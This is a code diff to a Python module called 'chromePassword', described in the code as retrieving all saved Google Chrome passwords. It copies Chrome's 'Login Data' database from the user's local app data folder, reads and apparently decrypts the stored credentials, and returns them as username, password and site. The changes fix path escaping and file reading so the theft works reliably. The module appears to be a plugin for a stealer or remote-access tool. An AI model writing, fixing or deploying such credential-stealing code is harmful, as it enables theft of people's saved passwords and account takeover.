@@ -3,10 +3,10 @@ __name__ = "chromePassword"
 __desc__ = "Retrieve all saved password of Google Chrome"
 def send():
     import os, sqlite3, win32crypt, shutil
-    sourceFileWithLogin = "%s\Google\Chrome\User Data\Profile 1\Login Data" % os.getenv("localappdata")
-    sourceFileWithoutLogin = "%s\Google\Chrome\User Data\Default\Login Data" % os.getenv("localappdata")
+    sourceFileWithLogin = "%s\\Google\\Chrome\\User Data\\Profile 1\\Login Data" % os.getenv("localappdata")
+    sourceFileWithoutLogin = "%s\\Google\\Chrome\\User Data\\Default\\Login Data" % os.getenv("localappdata")
     def get(sourceFile):
-        targetFile = "%s\TempData_C" % os.getenv("localappdata")
+        targetFile = "%s\\TempData_C" % os.getenv("localappdata")
         result = "<Username>:<Password> (Site)\n"
         shutil.copy(sourceFile, targetFile)
         connection = sqlite3.connect(targetFile)
@@ -24,12 +24,12 @@ def send():
         os.remove(targetFile)
         return result
     if os.path.exists(sourceFileWithoutLogin) and \
-        len(open(sourceFileWithoutLogin).readlines()) == 0 and \
+        len(open(sourceFileWithoutLogin, 'rb').readlines()) == 0 and \
         os.path.exists(sourceFileWithLogin):
         return get(sourceFileWithLogin)
     else:
         if os.path.exists(sourceFileWithoutLogin) and \
-            not len(open(sourceFileWithoutLogin).readlines()) == 0:
+            not len(open(sourceFileWithoutLogin, 'rb').readlines()) == 0:
             return get(sourceFileWithoutLogin)
         else:
             pass
